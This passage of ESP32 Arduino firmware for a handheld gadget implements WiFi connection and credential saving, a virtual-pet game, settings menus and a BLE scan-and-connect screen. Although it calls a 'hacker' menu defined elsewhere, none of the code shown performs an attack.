  WiFi.mode(WIFI_STA); WiFi.setSleep(false); WiFi.setAutoReconnect(true);
  esp_wifi_set_ps(WIFI_PS_NONE); esp_wifi_set_max_tx_power(80); esp_wifi_set_bandwidth(WIFI_IF_STA, WIFI_BW_HT20);
  if (pass && pass[0]) WiFi.begin(ssid, pass); else WiFi.begin(ssid);
  const char* states[] = {"Trying...", "Auth...", "Getting IP..."};
  unsigned long start = millis(); int lastState = -1;
  while (millis() - start < 10000) {
    if (WiFi.status() == WL_CONNECTED) return true;
    int st; if (millis()-start<2000) st=0; else if (millis()-start<5000) st=1; else st=2;
    if (st != lastState) { lastState = st; tft.fillRect(0, 36, 160, 10, TFT_BLACK); tft.drawString(states[st], 2, 36); }
    delay(150);
  }
  return false;
}
void wcResultScreen(bool ok, const char* ssid) {
  tft.fillScreen(TFT_BLACK);
  if (ok) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("OK  Connected", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char buf[40];
    snprintf(buf, sizeof(buf), "SSID: %.20s", ssid); tft.drawString(buf, 2, 18);
    snprintf(buf, sizeof(buf), "IP: %s", WiFi.localIP().toString().c_str()); tft.drawString(buf, 2, 32);
    snprintf(buf, sizeof(buf), "GW: %s", WiFi.gatewayIP().toString().c_str()); tft.drawString(buf, 2, 46);
    snprintf(buf, sizeof(buf), "RSSI: %d dBm", WiFi.RSSI()); tft.drawString(buf, 2, 60);
  } else {
    tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawString("FAILED", 2, 20);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Connect failed", 2, 36);
    tft.drawString("Check SSID/Pass", 2, 50);
  }
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:back", 110, 74);
}
void wcSaveCred(const char* ssid, const char* pass) {
  WifiCred wc; wc.magic = WC_MAGIC;
  memset(wc.ssid, 0, 33); memset(wc.pass, 0, 65);
  strncpy(wc.ssid, ssid, 32); strncpy(wc.pass, pass, 64);
  EEPROM.put(WC_EEPROM_ADDR, wc); EEPROM.commit();
  strncpy(g_wifiSSID, ssid, 32); g_wifiSSID[32] = 0;
  strncpy(g_wifiPass, pass, 64); g_wifiPass[64] = 0;
  wifiConfigured = true; wifiIpCacheClear();
}
void showWifiConnect() {
  deinitBLE();
  while (true) {
    if (!wcDoScan()) return;
    wcSelAp = 0; wcListOffset = 0;
    bool needRescan = false, needManual = false;
    int selectedAp = -1; bool openSelected = false;
    bool choosing = true;
    while (choosing) {
      wcDrawList();
      char k = getKey();
      if (k == 'U') { wcSelAp--; if (wcSelAp < 0) wcSelAp = wcApCount; }
      else if (k == 'D') { wcSelAp++; if (wcSelAp > wcApCount) wcSelAp = 0; }
      else if (k == 'L') { if (wcSelAp < wcApCount) { selectedAp=wcSelAp; openSelected=!wcAps[wcSelAp].enc; choosing=false; } else { needManual=true; choosing=false; } }
      else if (k == 'R') { needRescan = true; choosing = false; }
      else if (k == 'E') return;
      delay(20);
    }
    if (needRescan) continue;
    if (needManual) {
      if (!wcManualInputScreen()) continue;
      if (!wcPassScreen(wcManualSSID, true)) continue;
      bool ok = wcDoConnect(wcManualSSID, wcPass);
      wcResultScreen(ok, wcManualSSID);
      if (ok) { wcSaveCred(wcManualSSID, wcPass); while (true) { char kk = getKey(); if (kk == 'E') return; delay(20); } }
      else { while (true) { char kk = getKey(); if (kk=='E'||kk=='R'||kk=='L') break; delay(20); } continue; }
    }
    if (selectedAp >= 0) {
      const char* ssid = wcAps[selectedAp].ssid;
      if (!openSelected) { if (!wcPassScreen(ssid, true)) continue; } else { wcPass[0] = 0; }
      bool ok = wcDoConnect(ssid, wcPass);
      wcResultScreen(ok, ssid);
      if (ok) { wcSaveCred(ssid, wcPass); while (true) { char kk = getKey(); if (kk == 'E') return; delay(20); } }
      else { while (true) { char kk = getKey(); if (kk=='E'||kk=='R'||kk=='L') break; delay(20); } continue; }
    }
  }
}

// ==================================================
// ============== 宠物机界面 ==============
// ==================================================
void pet2DrawFish(int cx, int cy, uint8_t mood, bool blink) {
  static uint16_t goldC=0,darkGoldC=0,finC=0,eyeC=0,bubbleC=0;
  if (goldC==0) { goldC=tft.color565(255,140,40); darkGoldC=tft.color565(220,90,20); finC=tft.color565(255,180,90); eyeC=tft.color565(20,20,30); bubbleC=tft.color565(180,220,255); }
  tft.fillTriangle(cx+14,cy-2,cx+34,cy-14,cx+32,cy-1,finC);
  tft.fillTriangle(cx+14,cy+2,cx+34,cy+12,cx+32,cy+1,finC);
  tft.fillTriangle(cx+14,cy-3,cx+20,cy,cx+14,cy+3,goldC);
  tft.fillRoundRect(cx-18,cy-9,34,18,9,goldC); tft.fillCircle(cx-18,cy,9,goldC);
  tft.fillRoundRect(cx-14,cy-7,24,3,1,finC); tft.fillRoundRect(cx-15,cy+3,26,5,2,finC);
  tft.fillTriangle(cx-4,cy-9,cx+4,cy-9,cx-1,cy-18,darkGoldC);
  tft.fillTriangle(cx-6,cy+8,cx+4,cy+8,cx-1,cy+15,darkGoldC);
  tft.fillTriangle(cx-8,cy+2,cx-2,cy+8,cx-10,cy+7,darkGoldC);
  if (blink) tft.drawFastHLine(cx-16,cy-3,7,eyeC);
  else { tft.fillCircle(cx-13,cy-3,4,TFT_WHITE); tft.fillCircle(cx-12,cy-3,3,eyeC); tft.drawPixel(cx-13,cy-5,TFT_WHITE); tft.drawPixel(cx-14,cy-4,TFT_WHITE); }
  if (mood>=50) tft.drawCircleHelper(cx-24,cy+2,3,0x0C,eyeC); else tft.drawFastHLine(cx-26,cy+3,4,eyeC);
  if (mood>=60) { tft.drawCircle(cx-26,cy-12,2,bubbleC); if (mood>=80) { tft.drawCircle(cx-30,cy-18,2,bubbleC); tft.drawCircle(cx-24,cy-22,1,bubbleC); } }
}
void pet2DrawBar(int y, const char* label, uint8_t val, uint16_t color) {
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(label, 2, y);
  int bx = 26, bw = 88, by = y + 1;
  tft.drawRect(bx, by, bw, 6, TFT_DARKGREY);
  int fill = ((bw - 2) * val) / 100;
  if (fill > 0) tft.fillRect(bx + 1, by + 1, fill, 4, color);
  char b[4]; snprintf(b, sizeof(b), "%d", val); tft.drawString(b, bx + bw + 4, y);
}
void pet2ShowShop() {
  const int TOTAL = 18; const int GAP1 = 12;
  int sel = 0, msgTimer = 0; char msg[28] = ""; uint16_t msgColor = TFT_GREEN;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Shop", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const int visible = 6;
    int start = sel - 3; if (start < 0) start = 0; if (start > TOTAL - visible) start = TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i; if (idx >= TOTAL) break;
      int y = 12 + i * 10;
      if (idx == GAP1) { tft.drawFastHLine(2, y + 4, 156, TFT_DARKGREY); continue; }
      if (idx == sel) tft.fillRect(0, y - 1, 160, 10, 0x0010);
      String line;
      if (idx < GAP1) line = String(PET_FOODS[idx].name) + "  $" + String(PET_FOODS[idx].cost);
      else { int it = idx - GAP1 - 1; line = String(PET_ITEMS[it].name) + "  $" + String(PET_ITEMS[it].cost); }
      tft.setTextColor(idx == sel ? TFT_YELLOW : TFT_WHITE, idx == sel ? 0x0010 : TFT_BLACK);
      tft.drawString(line, 2, y);
    }
    if (msgTimer > 0) { tft.fillRect(0, 76, 160, 8, TFT_BLACK); tft.setTextColor(msgColor, TFT_BLACK); int len = strlen(msg); tft.drawString(msg, 80 - (len*6)/2, 76); msgTimer--; }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') { do { sel = (sel + TOTAL - 1) % TOTAL; } while (sel == GAP1); }
    else if (k == 'D') { do { sel = (sel + 1) % TOTAL; } while (sel == GAP1); }
    else if (k == 'L') {
      if (sel < GAP1) {
        if (pet2.coins >= PET_FOODS[sel].cost) {
          pet2.coins -= PET_FOODS[sel].cost;
          int8_t dH=pet2ClampAdd(pet2.hunger,PET_FOODS[sel].dHunger); int8_t dM=pet2ClampAdd(pet2.mood,PET_FOODS[sel].dMood);
          int8_t dC=pet2ClampAdd(pet2.clean,PET_FOODS[sel].dClean); int8_t dHP=pet2ClampAdd(pet2.health,PET_FOODS[sel].dHealth);
          int8_t dE=pet2ClampAdd(pet2.energy,PET_FOODS[sel].dEnergy);
          pet2AddExp(10); pet2AddBond(2); pet2.totalFeed++; pet2TaskAdd(0,1); pet2Unlock(0); pet2Save();
          char buf[28]=""; char tmp[8];
          if(dH){snprintf(tmp,sizeof(tmp),"H%+d ",dH);strcat(buf,tmp);} if(dM){snprintf(tmp,sizeof(tmp),"M%+d ",dM);strcat(buf,tmp);}
          if(dC){snprintf(tmp,sizeof(tmp),"C%+d ",dC);strcat(buf,tmp);} if(dHP){snprintf(tmp,sizeof(tmp),"HP%+d ",dHP);strcat(buf,tmp);} if(dE){snprintf(tmp,sizeof(tmp),"E%+d ",dE);strcat(buf,tmp);}
          strncpy(g_petMsg,buf,sizeof(g_petMsg)-1); g_petMsg[sizeof(g_petMsg)-1]=0;
          g_petMsgColor=TFT_GREEN; g_petMsgTimer=30; g_shopFed=true; return;
        } else { snprintf(msg,sizeof(msg),"Need %d$",PET_FOODS[sel].cost); msgColor=TFT_RED; msgTimer=25; }
      } else if (sel > GAP1) {
        int it = sel - GAP1 - 1;
        if (pet2.coins >= PET_ITEMS[it].cost) {
          pet2.coins -= PET_ITEMS[it].cost;
          int8_t dC=pet2ClampAdd(pet2.clean,PET_ITEMS[it].dClean); int8_t dM=pet2ClampAdd(pet2.mood,PET_ITEMS[it].dMood);
          int8_t dHP=pet2ClampAdd(pet2.health,PET_ITEMS[it].dHealth); int8_t dE=pet2ClampAdd(pet2.energy,PET_ITEMS[it].dEnergy);
          pet2AddBond(PET_ITEMS[it].dBond); pet2AddExp(8); pet2Save();
          char buf[28]=""; char tmp[8];
          if(dC){snprintf(tmp,sizeof(tmp),"C%+d ",dC);strcat(buf,tmp);} if(dM){snprintf(tmp,sizeof(tmp),"M%+d ",dM);strcat(buf,tmp);}
          if(dHP){snprintf(tmp,sizeof(tmp),"HP%+d ",dHP);strcat(buf,tmp);} if(dE){snprintf(tmp,sizeof(tmp),"E%+d ",dE);strcat(buf,tmp);}
          strncpy(g_petMsg,buf,sizeof(g_petMsg)-1); g_petMsg[sizeof(g_petMsg)-1]=0;
          g_petMsgColor=TFT_GREEN; g_petMsgTimer=30; g_shopFed=true; return;
        } else { snprintf(msg,sizeof(msg),"Need %d$",PET_ITEMS[it].cost); msgColor=TFT_RED; msgTimer=25; }
      }
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void pet2ShowTasks() {
  int sel = 0; const int TASK_TOTAL = 10;
  while (true) {
    pet2TaskRefresh(); clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Stage " + String(pet2.stage) + "/30", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    int visible = 7, start = sel - 3;
    if (start < 0) start = 0; if (start > TASK_TOTAL - visible) start = TASK_TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i; if (idx >= TASK_TOTAL) break;
      int y = 12 + i * 9;
      String line = (idx == sel) ? "> " : "  ";
      line += (pet2.taskProgress[idx] >= 100) ? "[V] " : "[ ] ";
      line += String(TASK_TPL[idx].desc);
      if (pet2.taskProgress[idx] >= 100) tft.setTextColor(TFT_GREEN, TFT_BLACK);
      else if (idx == sel) tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      else tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(line, 2, y);
      char pbuf[12]; snprintf(pbuf,sizeof(pbuf),"%d%%",pet2.taskProgress[idx]); tft.drawString(pbuf, 130, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + TASK_TOTAL - 1) % TASK_TOTAL;
    else if (k == 'D') sel = (sel + 1) % TASK_TOTAL;
    else if (k == 'L') { if (pet2StageComplete()) pet2AdvanceStage(); }
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void pet2ShowStats() {
  int sel = 0; const int STAT_TOTAL = 10;
  const char* labels[] = {"Level","Exp","Bond","Feed","Play","Sleep","Clean","Stage","Coins","Achs"};
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Stats", 2, 0);
    int visible = 7, start = sel - 3;
    if (start < 0) start = 0; if (start > STAT_TOTAL - visible) start = STAT_TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i; if (idx >= STAT_TOTAL) break;
      int y = 12 + i * 9; String val;
      switch (idx) { case 0: val = String(pet2.level); break;
        case 1: val = String(pet2.exp) + "/" + String(pet2ExpNeeded()); break;
        case 2: val = String(pet2.bond); break; case 3: val = String(pet2.totalFeed); break;
        case 4: val = String(pet2.totalPlay); break; case 5: val = String(pet2.totalSleep); break;
        case 6: val = String(pet2.totalClean); break; case 7: val = String(pet2.stage) + "/30"; break;
        case 8: val = String(pet2.coins); break;
        case 9: { int n = 0; for (int a = 0; a < 8; a++) if (pet2.ach & (1 << a)) n++; val = String(n) + "/8"; break; } }
      tft.setTextColor(idx == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(((idx == sel) ? "> " : "  ") + String(labels[idx]), 2, y);
      tft.drawString(val, 110, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + STAT_TOTAL - 1) % STAT_TOTAL;
    else if (k == 'D') sel = (sel + 1) % STAT_TOTAL;
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void pet2ShowAchs() {
  int sel = 0; const int ACH_TOTAL = 8;
  const char* names[] = {"First Meal","First Play","First Sleep","First Bath","Level 5","Level 10","100 Coins","Game Win"};
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Achievements", 2, 0);
    int visible = 7, start = sel - 3;
    if (start < 0) start = 0; if (start > ACH_TOTAL - visible) start = ACH_TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i; if (idx >= ACH_TOTAL) break;
      int y = 12 + i * 9; bool done = (pet2.ach >> idx) & 1;
      tft.setTextColor(done ? TFT_GREEN : (idx == sel ? TFT_YELLOW : TFT_WHITE), TFT_BLACK);
      tft.drawString(((idx == sel) ? "> " : "  ") + String(done ? "[V] " : "[ ] ") + String(names[idx]), 2, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + ACH_TOTAL - 1) % ACH_TOTAL;
    else if (k == 'D') sel = (sel + 1) % ACH_TOTAL;
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void showPetMenu() {
  int menuSel = 0;
  const char* items[] = {"Play","Sleep","Clean","Shop","Tasks","Stats","Achs"};
  const int COUNT = 7;
  char msg[24] = ""; uint16_t msgColor = TFT_GREEN; int msgTimer = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Pet Menu", 2, 0);
    for (int i = 0; i < COUNT; i++) { String pre = (i == menuSel) ? "> " : "  ";
      tft.setTextColor(i == menuSel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK); tft.drawString(pre + items[i], 2, 16 + i * 9); }
    if (msgTimer > 0) { tft.setTextColor(msgColor, TFT_BLACK); tft.drawString(msg, 2, 76); msgTimer--; }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + COUNT - 1) % COUNT;
    else if (k == 'D') menuSel = (menuSel + 1) % COUNT;
    else if (k == 'L') {
      switch (menuSel) {
        case 0: { if (pet2.energy >= 5) {
          int8_t dE=pet2ClampAdd(pet2.energy,-5); int8_t dM=pet2ClampAdd(pet2.mood,+12); int8_t dH=pet2ClampAdd(pet2.hunger,-3);
          pet2AddExp(8); pet2AddBond(1); pet2.totalPlay++; pet2TaskAdd(1,1); pet2Unlock(1);
          char buf[28]=""; char tmp[8];
          if(dM){snprintf(tmp,sizeof(tmp),"M%+d ",dM);strcat(buf,tmp);} if(dH){snprintf(tmp,sizeof(tmp),"H%+d ",dH);strcat(buf,tmp);} if(dE){snprintf(tmp,sizeof(tmp),"E%+d ",dE);strcat(buf,tmp);}
          strncpy(g_petMsg,buf,sizeof(g_petMsg)-1); g_petMsg[sizeof(g_petMsg)-1]=0;
          g_petMsgColor=TFT_GREEN; g_petMsgTimer=25; g_shopFed=true;
        } else { snprintf(msg,sizeof(msg),"Too tired!"); msgColor=TFT_RED; msgTimer=20; } break; }
        case 1: { int8_t dE=pet2ClampAdd(pet2.energy,+25); int8_t dM=pet2ClampAdd(pet2.mood,-5);
          pet2.totalSleep++; pet2TaskAdd(2,1); pet2AddExp(5); pet2Unlock(2);
          char buf[28]=""; char tmp[8];
          if(dE){snprintf(tmp,sizeof(tmp),"E%+d ",dE);strcat(buf,tmp);} if(dM){snprintf(tmp,sizeof(tmp),"M%+d ",dM);strcat(buf,tmp);}
          strncpy(g_petMsg,buf,sizeof(g_petMsg)-1); g_petMsg[sizeof(g_petMsg)-1]=0;
          g_petMsgColor=TFT_GREEN; g_petMsgTimer=25; g_shopFed=true; break; }
        case 2: { int8_t dC=pet2ClampAdd(pet2.clean,+100); int8_t dM=pet2ClampAdd(pet2.mood,+5);
          pet2.totalClean++; pet2TaskAdd(3,1); pet2AddExp(5); pet2Unlock(3);
          char buf[28]=""; char tmp[8];
          if(dC){snprintf(tmp,sizeof(tmp),"C%+d ",dC);strcat(buf,tmp);} if(dM){snprintf(tmp,sizeof(tmp),"M%+d ",dM);strcat(buf,tmp);}
          strncpy(g_petMsg,buf,sizeof(g_petMsg)-1); g_petMsg[sizeof(g_petMsg)-1]=0;
          g_petMsgColor=TFT_GREEN; g_petMsgTimer=25; g_shopFed=true; break; }
        case 3: pet2ShowShop(); if (g_shopFed) { g_shopFed = false; return; } break;
        case 4: pet2ShowTasks(); break;
        case 5: pet2ShowStats(); break;
        case 6: pet2ShowAchs(); break;
      }
      if (g_shopFed) { g_shopFed = false; return; }
    } else if (k == 'R' || k == 'E') return;
    delay(20);
  }
}
void showPetWhale() {
  deinitWifi(); deinitBLE();
  pet2Load();
  pet2ClampAdd(pet2.hunger,-5); pet2ClampAdd(pet2.mood,-5); pet2ClampAdd(pet2.clean,-5);
  pet2Save();
  g_petMsgTimer = 0; g_petMsg[0] = 0; g_petMsgColor = TFT_GREEN;
  bool blink = false; unsigned long lastBlink = millis();
  while (true) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Lv." + String(pet2.level), 2, 0);
    tft.drawString("$" + String(pet2.coins), 130, 0);
    pet2DrawFish(80, 21, pet2.mood, blink);
    if (g_petMsgTimer > 0) {
      tft.fillRect(38, 24, 84, 8, TFT_BLACK); tft.setTextColor(g_petMsgColor, TFT_BLACK);
      int len = strlen(g_petMsg); tft.drawString(g_petMsg, 80 - (len*6)/2, 24); g_petMsgTimer--;
    }
    pet2DrawBar(40, "H", pet2.hunger, TFT_RED);
    pet2DrawBar(48, "M", pet2.mood, TFT_YELLOW);
    pet2DrawBar(56, "E", pet2.energy, TFT_CYAN);
    pet2DrawBar(64, "C", pet2.clean, TFT_GREEN);
    pet2DrawBar(72, "B", pet2.bond, TFT_ORANGE);
    if (millis() - lastBlink > 3000) { lastBlink = millis(); blink = !blink; }
    char k = getKey();
    if (k == 'U') { showPetMenu(); if (pet2.energy > 100) pet2.energy = 100; pet2Save(); }
    else if (k == 'D') { showGameMenu(); }
    else if (k == 'L') { showHackerMenu(); }
    else if (k == 'R' || k == 'E') { showToolsMenu(); }
    delay(20);
  }
}

// ==================================================
// ============== 游戏按键设置 ==============
// ==================================================
const char* GAME_NAMES[GAME_COUNT] = {
  "Tetris","Breakout","Snake","Dino","Flappy","2048",
  "Minesweeper","Roguelike","Jump","TowerDef","Gomoku","(NA)"
};
void showGameKeySetting() {
  int gameSel = 0, keySel = 0, offset = 0; bool choosing = true;
  while (choosing) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Game Key Settings", 2, 0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:back", 110, 0);
    if (gameSel < offset) offset = gameSel; if (gameSel >= offset + 4) offset = gameSel - 3;
    for (int i = 0; i < 4 && offset + i < GAME_COUNT - 1; i++) { int idx = offset + i; int y = 14 + i * 12;
      tft.setTextColor(idx == gameSel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(((idx == gameSel) ? "> " : "  ") + String(GAME_NAMES[idx]), 2, y); }
    char k = getKey();
    if (k == 'U') { gameSel--; if (gameSel < 0) gameSel = GAME_COUNT - 2; }
    else if (k == 'D') { gameSel++; if (gameSel >= GAME_COUNT - 1) gameSel = 0; }
    else if (k == 'L') choosing = false;
    else if (k == 'R' || k == 'E') return;
    delay(20);
  }
  keySel = 0;
  const char* keyNames[4] = {"UP  ->", "DOWN->", "LEFT->", "RIGHT>"};
  const char* acts[4] = {"U","D","L","R"};
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString(String(GAME_NAMES[gameSel]) + " Keys", 2, 0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("L:cycle R2x:save", 88, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < 4; i++) { int y = 20 + i * 12;
      tft.setTextColor(i == keySel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      uint8_t a = g_gameKeyMap.map[gameSel][i];
      tft.drawString(((i == keySel) ? "> " : "  ") + String(keyNames[i]) + " " + String(acts[a]), 2, y); }
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("X:reset all", 2, 74);
    char k = getKey();
    if (k == 'U') keySel = (keySel + 3) % 4;
    else if (k == 'D') keySel = (keySel + 1) % 4;
    else if (k == 'L') g_gameKeyMap.map[gameSel][keySel] = (g_gameKeyMap.map[gameSel][keySel] + 1) % 4;
    else if (k == 'X') { for (int j = 0; j < 4; j++) g_gameKeyMap.map[gameSel][j] = j; }
    else if (k == 'R' || k == 'E') { gameKeyMapSave(); return; }
    delay(30);
  }
}

// ==================================================
// ============== 键盘样式设置 ==============
// ==================================================
void showKbLayoutSetting() {
  int sel = g_kbLayout;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Keyboard Layout", 80, 6, 1);
    const char* names[2] = {"A-Z Order", "QWERTY"};
    for (int i = 0; i < 2; i++) { int y = 30 + i * 16;
      tft.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(((i == sel) ? "> " : "  ") + String(names[i]), 2, y); }
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("L: save  R/E:back", 2, 74);
    char k = getKey();
    if (k == 'U') sel = (sel + 1) % 2;
    else if (k == 'D') sel = (sel + 1) % 2;
    else if (k == 'L') { g_kbLayout = (uint8_t)sel; EEPROM.write(720, g_kbLayout); EEPROM.commit();
      clearAll(); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("Saved!", 80, 36, 1); delay(600); return; }
    else if (k == 'R' || k == 'E') return;
    delay(30);
  }
}

// ==================================================
// ============== 黑客设置 ==============
// ==================================================
void showHackSettings() {
  int sel = 0;
  const char* items[] = {"Keyboard Layout","Memory","Log","About"};
  const int COUNT = 4;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Settings", 2, 0);
    for (int i = 0; i < COUNT; i++) { int y = 20 + i * 14;
      tft.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      String lab = items[i];
      if (i == 0) lab += String(" (") + (g_kbLayout == 0 ? "A-Z" : "QWERTY") + ")";
      tft.drawString(((i == sel) ? "> " : "  ") + lab, 2, y); }
    char k = getKey();
    if (k == 'U') sel = (sel + COUNT - 1) % COUNT;
    else if (k == 'D') sel = (sel + 1) % COUNT;
    else if (k == 'L') {
      if (sel == 0) showKbLayoutSetting();
      else if (sel == 1) showMemory();
      else if (sel == 2) showLog();
      else if (sel == 3) showAbout();
    } else if (k == 'R' || k == 'E') return;
    delay(30);
  }
}

// ==================================================
// ============== 工具设置 ==============
// ==================================================
void showToolsSettings() {
  int sel = 0;
  const char* items[] = {"Keyboard Layout"};
  const int COUNT = 1;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Tools Settings", 2, 0);
    for (int i = 0; i < COUNT; i++) { int y = 20 + i * 14;
      tft.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      String lab = items[i];
      if (i == 0) lab += String(" (") + (g_kbLayout == 0 ? "A-Z" : "QWERTY") + ")";
      tft.drawString(((i == sel) ? "> " : "  ") + lab, 2, y); }
    char k = getKey();
    if (k == 'U') sel = (sel + COUNT - 1) % COUNT;
    else if (k == 'D') sel = (sel + 1) % COUNT;
    else if (k == 'L') { if (sel == 0) showKbLayoutSetting(); }
    else if (k == 'R' || k == 'E') return;
    delay(30);
  }
}

// ==================================================
// ============== BLE Connect / Server ==============
// ==================================================
void showBleConnect() {
  deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500);
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("BLE Connect", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:back", 118, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawCentreString("Scanning 5s...", 80, 30, 1);
  NimBLEDevice::init("CakeOS"); bleInited = true;
  static char bufName[MAX_BLE_DEVICES][32]; static char bufMac[MAX_BLE_DEVICES][18];
  static int bufRssi[MAX_BLE_DEVICES]; static NimBLEAddress bufAddr[MAX_BLE_DEVICES];
  static int bufCount = 0; bufCount = 0;
  class CB : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
      if (bufCount >= MAX_BLE_DEVICES) return;
      for (int i = 0; i < bufCount; i++) if (bufAddr[i] == dev->getAddress()) { bufRssi[i] = dev->getRSSI(); return; }
      String nm = dev->haveName() ? dev->getName().c_str() : "(unknown)";
      strncpy(bufName[bufCount], nm.c_str(), 31); bufName[bufCount][31] = 0;
      String mac = dev->getAddress().toString().c_str();
      strncpy(bufMac[bufCount], mac.c_str(), 17); bufMac[bufCount][17] = 0;
      bufRssi[bufCount] = dev->getRSSI(); bufAddr[bufCount] = dev->getAddress(); bufCount++;
    }
  };
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(new CB(), false);
  pScan->setActiveScan(true); pScan->setInterval(100); pScan->setWindow(99);
  pScan->start(5, false);
  pScan->setScanCallbacks(nullptr); pScan->clearResults();
  bleDeviceCount = 0;
  for (int i = 0; i < bufCount; i++) {
    strncpy(bleDevices[bleDeviceCount].name, bufName[i], 31); bleDevices[bleDeviceCount].name[31] = 0;
    strncpy(bleDevices[bleDeviceCount].mac, bufMac[i], 11); bleDevices[bleDeviceCount].mac[11] = 0;
    bleDevices[bleDeviceCount].rssi = bufRssi[i]; bleAddrCache[bleDeviceCount] = bufAddr[i]; bleDeviceCount++;
  }
  if (bleDeviceCount == 0) { clearAll(); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawCentreString("No BLE device", 80, 30, 1); delay(800); NimBLEDevice::deinit(false); bleInited = false; delay(100); return; }
  int sel = 0, off = 0; bool choosing = true;
  while (choosing) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Select target", 2, 0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:back", 118, 0);
    if (sel < off) off = sel; if (sel >= off + 4) off = sel - 3;
    for (int i = 0; i < 4 && off + i < bleDeviceCount; i++) { int idx = off + i; int y = 14 + i * 12;
      tft.setTextColor(idx == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(((idx == sel) ? "> " : "  ") + String(bleDevices[idx].name), 2, y); }
    char k = getKey();
    if (k == 'U') sel = (sel + bleDeviceCount - 1) % bleDeviceCount;
    else if (k == 'D') sel = (sel + 1) % bleDeviceCount;
    else if (k == 'L') choosing = false;
    else if (k == 'R' || k == 'E') { NimBLEDevice::deinit(false); bleInited = false; delay(100); return; }
    delay(20);
  }
  clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Connecting...", 2, 0);
  NimBLEClient* client = NimBLEDevice::createClient();
  client->setConnectTimeout(6000);
  if (!client->connect(bleAddrCache[sel])) {
    tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawString("Connect failed", 2, 30);
    NimBLEDevice::deleteClient(client); delay(800);
    NimBLEDevice::deinit(false); bleInited = false; delay(100); return;
  }
  clearAll(); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("Connected", 2, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(bleDevices[sel].name, 2, 20);
  tft.drawString(bleDevices[sel].mac, 2, 34);
  int svcN = client->getServices(true).size();
  char buf[24]; snprintf(buf, sizeof(buf), "Services: %d", svcN); tft.drawString(buf, 2, 50);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R/E:disconnect", 2, 74);
  while (true) { char k = getKey(); if (k == 'R' || k == 'E') break; delay(20); }
